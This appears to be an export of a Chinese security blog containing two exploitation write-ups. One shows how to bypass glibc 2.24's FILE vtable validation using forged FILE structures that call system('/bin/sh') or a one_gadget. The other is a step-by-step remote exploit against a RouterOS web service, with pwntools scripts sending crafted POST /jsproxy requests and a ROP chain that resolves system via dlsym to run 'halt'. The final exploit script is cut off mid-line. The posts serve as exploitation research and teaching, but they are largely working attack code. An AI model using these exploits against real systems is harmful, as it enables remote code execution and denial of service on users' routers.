<p>新建一个目录用于存放编译文件，进入该文件夹(这里为<code>glibc_224</code> )，执行 <code>configure</code> 配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">mkdir glibc_224</div><div class="line">cd glibc_224/</div><div class="line">../glibc-2.24/configure --prefix=/home/haclh/workplace/glibc_224  --disable-werror  --enable-debug=yes</div></pre></td></tr></table></figure></p>
<p>然后 <code>make -j8 &amp;&amp; make install</code>, 即可在 <code>/home/haclh/workplace/glibc_224</code> 找到编译好的 <code>libc</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854267668556jyfkc.png?imageslim" alt="paste image"></p>
<p>对 <code>vtable</code> 进行校验的函数是 <code>IO_validate_vtable</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854356776exse0i7d.png?imageslim" alt="paste image"><br>就是保证 <code>vtable</code>  要在 <code>__stop___libc_IO_vtables</code>  和 <code>__start___libc_IO_vtables</code>  之间。</p>
<p>绕过的方法是在 <code>__stop___libc_IO_vtables</code>  和 <code>__start___libc_IO_vtables</code>  之间找到可以利用的东西，下面介绍两种。</p>
<p>前提：可以伪造 <code>FILE</code> 机构体</p>
<p>测试代码 ( <a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/" target="_blank" rel="external">来源</a> )<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">/* gcc vuln.c -o vuln */</div><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">char fake_file[0x200];</div><div class="line"></div><div class="line">int main() &#123;</div><div class="line">  FILE *fp;</div><div class="line">  puts(&quot;Leaking libc address of stdout:&quot;);</div><div class="line">  printf(&quot;%p\n&quot;, stdout); // Emulating libc leak</div><div class="line">  puts(&quot;Enter fake file structure&quot;);</div><div class="line">  read(0, fake_file, 0x200);</div><div class="line">  fp = (FILE *)&amp;fake_file;</div><div class="line">  fclose(fp);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先  <code>printf(&quot;%p\n&quot;, stdout)</code> 用来泄露 <code>libc</code> 地址，然后使用 <code>read</code> 读入数据用来伪造 <code>FILE</code> 结构体， 最后调用 <code>fclose(fp)</code>.</p>
<p><strong>利用__IO_str_overflow</strong></p>
<p><code>__IO_str_overflow</code>是 <code>_IO_str_jumps</code> 的一个函数指针.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854803562nlpu56fi.png?imageslim" alt="paste image"></p>
<p><code>_IO_str_jumps</code> 就位于  <code>__stop___libc_IO_vtables</code>  和 <code>__start___libc_IO_vtables</code>  之间 所以我们是可以通过 <code>IO_validate_vtable</code> 的检测的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854871422xc7w9jfz.png?imageslim" alt="paste image"><br>具体怎么拿 <code>shell</code> 还得看看 <code>__IO_str_overflow</code> 的 <a href="https://code.woboq.org/userspace/glibc/libio/strops.c.html#_IO_str_overflow" target="_blank" rel="external">源代码</a>, 这里我就用 <code>ida</code> 看了（清楚一些）</p>
<p>首先是对 <code>fp-&gt;_flag</code> 做了一些判断</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515855084706pnihsyv9.png?imageslim" alt="paste image"><br>将 <code>fp-&gt;_flag</code> 设为 <code>0x0</code>, 就不会进入。接下来的才是重点</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515855153693f1zfksay.png?imageslim" alt="paste image"></p>
<p>可以看到 如果 设置 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt; fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</div></pre></td></tr></table></figure>
<p>我们就能进入 <code>(fp[1]._IO_read_ptr)(2 * size + 100)</code>, 回到汇编看看。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515855325659c257jd86.png?imageslim" alt="paste image"></p>
<p>执行 <code>call    qword ptr [fp+0E0h]</code>， <code>fp+0E0h</code> 使我们控制的，于是可以控制 <code>rip</code>, 此时的参数为 <code>2 * size + 100</code>, 而 <code>size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code> 所以此次 <code>call</code> 的参数也是可以控制的。</p>
<p>利用思路就很简单了，设置 <code>fp+0xe0</code> 为 <code>system</code>, 同时设置 <code>fp-&gt;_IO_buf_end</code> 和 <code>fp-&gt;_IO_buf_base</code>, 使得 <code>2 * size + 100</code> 为 <code>/bin/sh</code> 的地址， 执行 <code>system(&quot;/bin/sh&quot;)</code> 获取 <code>shell</code>。</p>
<p>比如<code>fp-&gt;_IO_buf_base=0</code> 和 <code>fp-&gt;_IO_buf_end=(sh-100)/2</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fake_file += p64(0x0)   	 # buf_base</div><div class="line">fake_file += p64((sh-100)/2) # buf_end</div></pre></td></tr></table></figure>
<p>当执行 <code>fclose</code> 是会 调用 <code>_IO_FINISH (fp)</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515855936790mnhxjuk7.png?imageslim" alt="paste image"></p>
<p>其实就是 <code>fp-&gt;vtable-&gt;__finish</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</div></pre></td></tr></table></figure></p>
<p>执行 <code>_IO_FINISH (fp)</code> 之前还对 锁进行了获取， 所以我们需要设置 <code>fp-&gt;_lock</code> 的值为一个 指向 <code>0x0</code> 的值（<code>*ptr=0x0000000000000000</code>），所以最终的 <code>file</code> 结构体的内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">fake_file = p64(0x0)  # flag</div><div class="line">fake_file += p64(0x0)    # read_ptr</div><div class="line">fake_file += p64(0x0)    # read_end</div><div class="line">fake_file += p64(0x0)    # read_base</div><div class="line"></div><div class="line"></div><div class="line">fake_file += p64(0x0)        # write_base</div><div class="line">fake_file += p64(sh) 		 # write_ptr - write_base  &gt; buf_end - buf_base, bypass check</div><div class="line">fake_file += p64(0x0)        # write_end</div><div class="line"></div><div class="line">fake_file += p64(0x0)   	 # buf_base</div><div class="line">fake_file += p64((sh-100)/2) # buf_end</div><div class="line"></div><div class="line">fake_file += &quot;\x00&quot; * (0x88 - len(fake_file))  # padding for _lock</div><div class="line">fake_file += p64(0x00601273)   # ptr--&gt;0x0 , for bypass get lock</div><div class="line"></div><div class="line"># p _IO_str_jumps</div><div class="line">fake_file += &quot;\x00&quot; * (0xd8 - len(fake_file))  # padding for vtable</div><div class="line">fake_file += p64(_IO_jump_t + 0x8) # make __IO_str_overflow on __finish , which call by fclose</div><div class="line"></div><div class="line">fake_file += &quot;\x00&quot; * (0xe0 - len(fake_file))  # padding for vtable</div><div class="line">fake_file += p64(system) # ((_IO_strfile *) fp)-&gt;_s._allocate_buffer</div></pre></td></tr></table></figure>
<p>有一个小细节我把 <code>vtable</code> 设置为了 <code>p64(_IO_jump_t + 0x8)</code>,原因在于 一个正常的 <code>FILE</code> 结构体的 <code>vtable</code> 的结构为</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515856301831h58wszly.png?imageslim" alt="paste image"></p>
<p><code>_finish</code> 在第三个字段</p>
<p><code>__IO_str_overflow</code>是 <code>_IO_str_jumps</code> 的第4个字段.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854803562nlpu56fi.png?imageslim" alt="paste image"></p>
<p><code>vtable</code> 设置为 <code>p64(_IO_jump_t + 0x8)</code> 后， <code>vtable-&gt;_finish</code> 为 <code>__IO_str_overflow</code> 的地址了。</p>
<p>在调用 <code>fclose</code> 处下个断点，断下来后打印第一个参数<br><img src="http://oy9h5q2k4.bkt.clouddn.com/151585657581289u226j6.png?imageslim" alt="paste image"><br>可以看到 </p>
<ul>
<li><code>_flags</code> 域 为 0</li>
<li><code>2*(buf_end - buf_base) + 100</code> 指向 <code>/bin/sh</code></li>
<li><code>_lock</code> 指向 <code>0x0</code></li>
<li>虚表的第三个表项（<code>vtable-&gt;_finish</code>）为 <code>__IO_str_overflow</code> 的地址</li>
<li><code>$rdi+0xe0</code> 为 <code>system</code> 的地址(rdi即为 fp)</li>
</ul>
<p>这样在执行 <code>fclose</code> 时就会进入 <code>__IO_str_overflow</code> ，然后进入 <code>call    qword ptr [fp+0E0h]</code> 执行  <code>system(&quot;/bin/sh&quot;)</code> 拿到 <code>shell</code> </p>
<p><strong>利用 _IO_wstr_finish</strong></p>
<p><code>_IO_wstr_finish</code> 位于 <code>_IO_wstr_jumps</code> 里面</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515857161075rcccf4qo.png?imageslim" alt="paste image"></p>
<p>可以看到 <code>_IO_wstr_jumps</code>  也是位于 位于  <code>__stop___libc_IO_vtables</code>  和 <code>__start___libc_IO_vtables</code>  之间的。</p>
<p><code>_IO_wstr_finish</code>  的 <code>check</code> 比较简单</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515857235249m55yixue.png?imageslim" alt="paste image"></p>
<p>当 <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> 不为0， 而且 <code>v2-&gt;_flags2</code> 就可以劫持 <code>rip</code> 了，看汇编代码会清晰不少</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515857376013zpcvyoh1.png?imageslim" alt="paste image"></p>
<p>只需要在 <code>fp+0xa0</code> 处放置一个指针 <code>ptr</code> , 使得 <code>ptr+0x30</code> 处的 值不为 0 即可。（这个值随便找就行），然后 设置   <code>fp+0x74</code> 的值为 <code>0</code>， 最后设置 <code>fp+0xe8</code> 的值为 <code>one_shot</code> ，在执行 <code>fclose()</code>时就会去执行 <code>one_shot</code> 拿到 <code>shell</code></p>
<p>伪造 <code>file</code> 结构体的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">fake_file = p64(0x0)  # flag</div><div class="line">fake_file += p64(0x0)    # read_ptr</div><div class="line">fake_file += p64(0x0)    # read_end</div><div class="line">fake_file += p64(0x0)    # read_base</div><div class="line"></div><div class="line"></div><div class="line">fake_file += p64(0x0)        # write_base</div><div class="line">fake_file += p64(sh) 		 # write_ptr - write_base  &gt; buf_end - buf_base, bypass check</div><div class="line">fake_file += p64(0x0)        # write_end</div><div class="line"></div><div class="line">fake_file += p64(0x0)   	 # buf_base</div><div class="line">fake_file += p64((sh-100)/2) # buf_end</div><div class="line"></div><div class="line"></div><div class="line">fake_file += &quot;\x00&quot; * (0x88 - len(fake_file))  # padding for _lock</div><div class="line"></div><div class="line">fake_file += p64(0x00601273)   # ptr--&gt;0x0 , for bypass get lock</div><div class="line"></div><div class="line">fake_file +=  &quot;\x00&quot; * (0xa0 - len(fake_file)) </div><div class="line">fake_file += p64(0x601030) # _wide_data</div><div class="line"></div><div class="line"># p &amp;_IO_wstr_jumps</div><div class="line">fake_file += &quot;\x00&quot; * (0xd8 - len(fake_file))  # padding for vtable</div><div class="line">fake_file += p64(_IO_wstr_jumps) </div><div class="line"></div><div class="line">fake_file += &quot;\x00&quot; * (0xe8 - len(fake_file))  # padding for vtable</div><div class="line">fake_file += p64(one_shot) # rip</div></pre></td></tr></table></figure></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>ida看代码比较清楚，文中的两种方法挺不错，利用了其他的 <code>vtable</code> 中的有趣的函数来绕过 <code>check</code></p>
<p><strong>参考</strong></p>
<p><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/" target="_blank" rel="external">https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</a></p>
<p><a href="http://blog.rh0gue.com/2017-12-31-34c3ctf-300/" target="_blank" rel="external">http://blog.rh0gue.com/2017-12-31-34c3ctf-300/</a></p>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> file struct </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步 Pwn RouterOS之exploit构造]]></title>
      <url>/2018/01/06/pwn_router_os_step_exp.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>前面已经分析完漏洞，并且搭建好了调试环境，本文将介绍如何利用漏洞写出 <code>exploit</code></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>控制 eip</strong></p>
<p>看看我们现在所拥有的能力</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15151713048316b66g6te.png?imageslim" alt="paste image"></p>
<p>我们可以利用 <code>alloca</code> 的 <code>sub esp *</code> 把栈抬高，然后往 那里写入数据。</p>
<p>现在的问题是我们栈顶的上方有什么重要的数据是可以修改的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515171497999x0f7vynu.png?imageslim" alt="paste image"></p>
<p>一般情况下，我们是没办法利用的，因为 栈上面就是 堆， 而他们之间的地址是不固定的。 </p>
<p>为了利用该漏洞，需要了解一点多线程实现的机制，不同线程拥有不同的线程栈， 而线程栈的位置就在 进程的 栈空间内。线程栈 按照线程的创建顺序，依次在 栈上排列。线程栈的大小可以指定。默认大概是 8MB.</p>
<p>写了一个小程序，测试了一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">#include &lt;pthread.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/time.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#define MAX 10</div><div class="line">pthread_t thread[2];</div><div class="line">pthread_mutex_t mut;</div><div class="line">int number=0, i;</div><div class="line">void *thread1()</div><div class="line">&#123;</div><div class="line">		int a;</div><div class="line">        printf(&quot;thread1 %p\n&quot;, &amp;a);</div><div class="line">&#125;</div><div class="line">void *thread2()</div><div class="line">&#123;</div><div class="line">       	int a;</div><div class="line">        printf(&quot;thread2 %p\n&quot;, &amp;a);</div><div class="line">&#125;</div><div class="line">void thread_create(void)</div><div class="line">&#123;</div><div class="line">        int temp;</div><div class="line">        memset(&amp;thread, 0, sizeof(thread));          //comment1</div><div class="line">        /*创建线程*/</div><div class="line">        if((temp = pthread_create(&amp;thread[0], NULL, thread1, NULL)) != 0)       //comment2</div><div class="line">                printf(&quot;线程1创建失败!\n&quot;);</div><div class="line">        else</div><div class="line">                printf(&quot;线程1被创建\n&quot;);</div><div class="line">        if((temp = pthread_create(&amp;thread[1], NULL, thread2, NULL)) != 0)  //comment3</div><div class="line">                printf(&quot;线程2创建失败&quot;);</div><div class="line">        else</div><div class="line">                printf(&quot;线程2被创建\n&quot;);</div><div class="line">&#125;</div><div class="line">void thread_wait(void)</div><div class="line">&#123;</div><div class="line">        /*等待线程结束*/</div><div class="line">        if(thread[0] !=0) &#123;                   //comment4</div><div class="line">                pthread_join(thread[0],NULL);</div><div class="line">                printf(&quot;线程1已经结束\n&quot;);</div><div class="line">        &#125;</div><div class="line">        if(thread[1] !=0) &#123;                //comment5</div><div class="line">                pthread_join(thread[1],NULL);</div><div class="line">                printf(&quot;线程2已经结束\n&quot;);</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">        /*用默认属性初始化互斥锁*/</div><div class="line">        pthread_mutex_init(&amp;mut,NULL);</div><div class="line">        printf(&quot;我是主函数哦，我正在创建线程，呵呵\n&quot;);</div><div class="line">        thread_create();</div><div class="line">        printf(&quot;我是主函数哦，我正在等待线程完成任务阿，呵呵\n&quot;);</div><div class="line">        thread_wait();</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>就是打印了两个线程中的栈内存地址信息，然后相减，就可以大概知道线程栈的大小。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515171997712kemr24ne.png?imageslim" alt="paste image"></p>
<p>多次运行发现，线程栈之间应该是相邻的，因为打印出来的值的差是固定的。</p>
<p>线程栈也是可以通过 <code>pthread_attr_setstacksize</code> 设置, 在 <code>RouterOs</code> 的 <code>www</code>的 <code>main</code> 函数里面就进行了设置。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515172296024czdw05qh.png?imageslim" alt="paste image"></p>
<p>所以在 <code>www</code> 中的线程栈的大小 为 <code>0x20000</code>。</p>
<p>当我们同时开启两个 <code>socket</code> 连接时，进程的栈布局</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515172554545mn6hijda.png?imageslim" alt="paste image"></p>
<p>此时在 <code>线程 1</code> 中触发漏洞，我们就能修改 <code>线程 2</code> 的数据。</p>
<p>现在的思路就很简单了，我们去修改 线程2 中的某个返回地址， 然后进行 <code>rop</code>.为了精确控制返回地址。先使用 <code>cyclic</code> 来确定返回地址的偏移.因为该程序线程栈的大小为 <code>0x20000</code> 所以用一个大一点的值试几次就能试出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">def makeHeader(num):</div><div class="line">    return &quot;POST /jsproxy HTTP/1.1\r\nContent-Length: &quot; + str(num) + &quot;\r\n\r\n&quot;</div><div class="line"></div><div class="line"></div><div class="line">s1 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line">s2 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line"></div><div class="line"></div><div class="line">s1.send(makeHeader(0x20900))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line">s2.send(makeHeader(0x100))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line"></div><div class="line">s1.send(cyclic(0x2000))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line"></div><div class="line">s2.close()  # tigger </div><div class="line">pause()</div></pre></td></tr></table></figure></p>
<p>崩溃后的位置<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515203525302ht7bhy5u.png?imageslim" alt="paste image"></p>
<p>然后用 <code>eip</code> 的值去计算下偏移</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515203624359611r5xlg.png?imageslim" alt="paste image"></p>
<p>然后调整 <code>poc</code> 测试一下<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515203798622buq6fgpb.png?imageslim" alt="paste image"></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515203815266tllctxmq.png?imageslim" alt="paste image"></p>
<p>ok, 接下来就是 <code>rop</code> 了。</p>
<p><strong>rop</strong></p>
<p>程序中没有 <code>system</code>, 所以我们需要先拿到 <code>system</code> 函数的地址，然后调用 <code>system</code> 执行命令即可。</p>
<p>这里采取的 <code>rop</code> 方案如下。</p>
<ul>
<li>首先 通过 <code>rop</code> 调用 <code>strncpy</code> 设置我们需要的字符串（我们只有一次输入机会）</li>
<li>然后调用 <code>dlsym</code> , 获取 <code>system</code> 的函数</li>
<li>调用 <code>system</code> 执行命令</li>
</ul>
<p>使用 <code>strncpy</code> 设置我们需要的字符串的思路非常有趣。 因为我们只有一次的输入机会，而<code>dlsym</code> 和 <code>system</code> 需要的参数都是 字符串指针， 所以我们必须在 调用它们之前把 需要的字符串事先布置到已知的地址，使用 <code>strncpy</code> 我们可以使用 程序文件中自带的一些字符来拼接字符串。</p>
<p>下面看看具体的 <code>exp</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515204586149s7886t42.png?imageslim" alt="paste image"></p>
<p>首先这里使用 了 <code>ret 0x1bb</code> 用来把栈往下移动了一下，因为程序运行时会修改其中的一些值，导致 <code>rop</code> 链被破坏，把栈给移下去就可以绕过了。（这个自己调 <code>rop</code> 的时候注意看就知道了。）</p>
<p>首先我们得设置 <code>system</code> 字符串 和 要执行的命令 这里为 <code>halt</code>(关机命令)。 以 <code>system</code> 字符串 的构造为例。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515204942477uir3mq2s.png?imageslim" alt="paste image"><br>分3次构造了 <code>system</code> 字符串，首先设置 <code>sys</code> , 然后 <code>te</code> , 最后 <code>m</code>.</p>
<p>同样的原理设置好 <code>halt</code> , 然后调用 <code>dlsym</code> 获取  <code>system</code> 的地址。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15152051616411xqvk27b.png?imageslim" alt="paste image"><br>执行 <code>dlsym(0, &quot;system&quot;)</code> 即可获得 <code>system</code> 地址， 函数返回时保存在 <code>eax</code>, 所以接下来 在栈上设置好参数（<code>halt</code> 字符串的地址） 然后 <code>jmp eax</code> 即可。</p>
<p>下面调试看看<br>首先 <code>ret 0x1bb</code>, 移栈<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205323369xyzljof1.png?imageslim" alt="paste image"></p>
<p>然后是执行 <code>strncpy</code> 设置 <code>system</code>.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205402433o5soeoxp.png?imageslim" alt="paste image"></p>
<p>设置完后，我们就有了 <code>system</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205476774vuyjgswn.png?imageslim" alt="paste image"></p>
<p>然后执行 <code>dlsym(0, &quot;system&quot;)</code> </p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205601990727005zg.png?imageslim" alt="paste image"></p>
<p>执行完后， <code>eax</code> 保存着 <code>system</code> 函数的地址</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205780535xi426xmw.png?imageslim" alt="paste image"></p>
<p>然后利用 <code>jmp eax</code> 调用 <code>system(&quot;halt&quot;)</code>.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205845365jiu6x47t.png?imageslim" alt="paste image"></p>
<p>运行完后，系统就关机了。</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>理解了多线程的机制。 对于不太好计算的，可以猜个粗略的值，然后使用 <code>cyclic</code> 来确定之。 <code>strncpy</code> 设置字符串的技巧不错。 <code>dlsym(0, &quot;system&quot;)</code> 可以用来获取函数地址。调试 <code>rop</code> 时要细心，<code>rop</code> 链被损坏使用 <code>ret *</code> 之类的操作绕过之。一些不太懂的东西，写个小的程序测试一下。</p>
<p><strong>exp</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">def makeHeader(num):</div><div class="line">    return &quot;POST /jsproxy HTTP/1.1\r\nContent-Length: &quot; + str(num) + &quot;\r\n\r\n&quot;</div><div class="line"></div><div class="line"></div><div class="line">s1 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line">s2 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line"></div><div class="line"></div><div class="line">s1.send(makeHeader(0x20900))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line">s2.send(makeHeader(0x100))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">strncpy_plt = 0x08050D00</div><div class="line">dlsym_plt = 0x08050C10</div><div class="line"></div><div class="line">system_addr = 0x0805C000 + 2</div><div class="line">halt_addr = 0x805c6e0</div><div class="line"></div><div class="line">#pop edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</div><div class="line"># .text:08059C03                 pop     ebx</div><div class="line"># .text:08059C04                 pop     esi</div><div class="line"># .text:08059C05                 pop     ebp</div><div class="line"># .text:08059C06                 retn</div><div class="line">ppp_addr = 0x08059C03</div><div class="line">pp_addr = 0x08059C04</div><div class="line">pppppr_addr = 0x080540b4</div><div class="line"># 0x0805851f : ret 0x1bb</div><div class="line">ret_38 = 0x0804ae8c</div><div class="line">ret_1bb = 0x0805851f</div><div class="line">ret = 0x0804818c</div><div class="line"># make system str</div><div class="line"></div><div class="line">payload = &quot;&quot;</div><div class="line">payload += p32(ret_1bb)   # for bad string</div><div class="line">payload += p32(ret)</div><div class="line">payload += &quot;A&quot; * 0x1bb</div><div class="line">payload += p32(ret) # ret</div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(system_addr)</div><div class="line">payload += p32(0x0805ab58)  # str syscall</div><div class="line">payload += p32(3)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(system_addr + 3)</div><div class="line">payload += p32(0x0805b38d)  # str tent</div><div class="line">payload += p32(2)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(system_addr 